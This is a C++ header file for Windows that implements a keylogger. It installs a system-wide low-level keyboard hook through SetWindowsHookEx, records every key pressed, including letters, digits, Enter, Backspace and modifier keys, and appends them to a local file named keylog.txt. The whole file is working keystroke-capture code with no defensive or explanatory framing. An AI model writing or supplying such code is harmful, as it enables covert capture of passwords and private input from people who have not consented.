#pragma once
#include <iostream>
#include <fstream>
#include <windows.h>
#include <atomic>

std::atomic<bool> isKeylogging(false);

void logKeystroke(int key) {
	std::ofstream logFile;
	logFile.open("keylog.txt", std::ios::app);

	if (key == VK_BACK) 														logFile << "[BACKSPACE]";
	else if (key == VK_RETURN) 													logFile << "[ENTER]";
	else if (key == VK_SPACE) 													logFile << " ";
	else if (key == VK_TAB)														logFile << "[TAB]";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) 			logFile << "[SHIFT]";
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)		logFile << "[CTRL]";
	else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU)				logFile << "[ALT]";
	else if (key == VK_ESCAPE) 													logFile << "[ESC]";
	else if (key == VK_OEM_PERIOD)												logFile << ".";
	else if (key >= 'A' && key <= 'Z') 											logFile << char(key);
	else if (key >= '0' && key <= '9') 											logFile << char(key);
	else																		logFile << "[" << key << "]";

	logFile.close();
}

// Analysis keyboard press down
LRESULT CALLBACK keyboardPRoc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogging.load()) {
		KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
		int key = pKeyboard->vkCode;
		logKeystroke(key);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void keyLogger() {
	isKeylogging.store(true);

	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardPRoc, NULL, 0);
	if (!keyboardHook) return;
	
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	UnhookWindowsHookEx(keyboardHook);
}